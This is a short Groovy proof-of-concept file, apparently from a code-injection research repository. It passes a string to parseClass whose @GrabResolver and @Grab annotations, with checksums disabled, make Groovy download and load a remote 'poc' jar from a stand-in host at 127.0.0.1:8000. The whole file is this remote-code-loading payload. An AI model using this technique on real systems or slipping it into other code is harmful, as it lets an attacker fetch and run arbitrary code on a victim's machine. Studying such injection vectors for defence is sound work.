package com.t4rrega.injection.Code.Groovy

this.class.classLoader.parseClass('''
    @GrabConfig(disableChecksums=true)
    @GrabResolver(name = "Exp",root = "http://127.0.0.1:8000/")
    @Grab(group = "test",module = "poc",version = "0.1")
    import java.lang.String
''');
